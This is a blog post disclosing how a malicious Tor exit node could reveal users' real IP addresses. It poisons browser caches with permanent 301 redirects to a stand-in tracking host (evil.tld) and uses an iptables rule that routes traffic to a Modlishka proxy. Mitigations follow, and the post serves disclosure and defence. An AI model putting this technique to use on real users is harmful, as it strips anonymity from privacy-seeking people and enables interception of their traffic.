---
layout: post
title: Disclosing your real TOR IP address through 301 HTTP Redirect Cache Poisoning 
---

This blog post describes a possible technique that can be used by a malicious TOR exit node to identify real IP address of TOR users. 

This approach is based on the previously described technique of permanently hijacking certain non-TLS URLS through "[HTTP 301 Cache Poisoning](https://blog.duszynski.eu/domain-hijack-through-http-301-cache-poisoning/)" - persistence of the poisoned cache is the key element here, which makes this possible...

### Example Attack Scenario


Assumptions:
- Browser-based application (in this case a standard browser) will connect through the TOR network and, eventually, malicious TOR exit node.
- Malicious TOR exit node that is intercepting and HTTP 301 cache poisoning all of the non-tls HTTP traffic.

![Disclosing TOR client IP address](https://raw.githubusercontent.com/drk1wi/assets/master/tor_ip.png)

Lets consider the following attack scenario steps:

1. User connects to the Internet through the TOR network either by setting up browsers' settings to use the TOR SOCKS5 or system wide, where the whole OS traffic is being routed through the TOR network.
2. User begins his typical browsing session with his favorite browser, where usually a lot of non-TLS HTTP traffic is being sent through the TOR tunnel. 
3. Evil TOR exit node intercepts those non-TLS requests and responds with a HTTP 301 permanent redirect to each of them. These redirects will be cached permanently by the browser and will point to a tracking URL with an assigned TOR client identifier. 
The tracking URL can be created in the following way: http://user-identifier.evil.tld. _Evil.tld_ will collect all source IP information and redirect to the original host or to a transparent reverse proxy, such as Modlishka, in an attempt intercept all of the clients following HTTP traffic.
Furthermore, since it is also possible to carry out an automated cache pollution for the most popular domains (as described in the previous [post](https://blog.duszynski.eu/domain-hijack-through-http-301-cache-poisoning/), e.g. TOP Alexa 100 , an attacker can further try to maximize his chances of disclosing the real IP address.
4. User, after closing the TOR session, will switch back to his usual network.
5. As soon user types into the URL address bar one of the previously poisoned entries, e.g. "google.com," browser will use the cache and internally redirect to the tracking URL with an exit-node context identifier.
6. Exit node will now be able to correlate previously intercepted HTTP request and users' real IP address through the information gathered on the external host that used tracking URL with user identifier. The _evil.tld_ host will have information about all of the IP addresses that were used to access that tracking URL.

Obviously, this gives a possibility to effectively correlate chosen HTTP requests with the client IP address. However, it is also possible to include a dynamic and transparent reverse proxy in this scenario that will try to compromise all further HTTP encrypted traffic that is leaving the TOR exit node. 
A simple IPTABLES redirect rule would be sufficient in this case:

```bash
iptables -t nat -I POSTROUTING -p tcp --dport 80 -j SNAT --to modlishka_ip_address:80
```

Another approach, might rely on injecting modified JavaScript with embed tracking URLS into the relevant non-TLS responses and setting up the right Cache control headers (e.g. to 'Cache-Control: max-age=31536000'). However, it would rely on a single non-TLS domain and wouldn't that effective.


### Conclusions
The fact that it is possible to achieve certain persistence in browsers cache can be abused to disclose real IP address of the TOR user by a malicious TOR exit node.

Possible mitigation:
- When connecting through TOR network only use browsers 'private' mode and close it after the TOR session is over.
- Disable all non-TLS traffic, when routing all OS traffic through the TOR network.
- Use TOR-browser whenever possible.
